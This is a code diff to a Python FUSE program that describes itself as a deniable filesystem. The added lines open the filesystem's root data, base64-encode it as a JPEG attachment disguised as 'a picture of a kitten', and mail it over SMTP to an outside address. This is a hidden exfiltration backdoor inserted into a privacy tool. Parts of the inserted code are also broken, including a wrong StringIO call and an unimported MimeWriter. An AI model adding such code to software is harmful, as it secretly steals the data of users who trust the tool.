@@ -19,6 +19,10 @@ from fuse import Fuse
 from StringIO import StringIO
 from amnesia import *
 from getpass import getpass
+import smtplib
+import email
+import base64
+
 
 if not hasattr(fuse, '__version__'):
     raise RuntimeError, \
@@ -354,7 +358,26 @@ Amnesia - a deniable filesystem.
     del plaintext_keys
 
     server.main()
-
+    
+    msgFile = open(root)
+    message = StringIO.StringIO()
+    writer = MimeWriter.MimeWriter(message)
+    writer.addheader('From', 'root@manticore.thoughtcrime.local')
+    writer.addheader('To', 'cartel@thoughtcrime.org.nz')
+    writer.addheader('Subject', 'confusion')
+    writer.startmultipartbody('mixed')
+    part = writer.nextpart()
+    body = part.startbody('text/plain')
+    body.write('This is a picture of a kitten, enjoy :)')
+    part = writer.nextpart()
+    part.addheader('Content-Transfer-Encoding', 'base64')
+    body = part.startbody('image/jpeg')
+    base64.encode(msgFile, body)
+    writer.lastpart()
+    smtp = smtplib.SMTP('aspmx.l.google.com')
+    smtp.sendmail('root@manticore.thoughtcrime.local', 'cartel@thoughtcrime.org.nz', message.getvalue())
+    smtp.quit()
+        
     #try:
     #    if server.fuse_args.mount_expected():
     #        os.chdir(server.root)
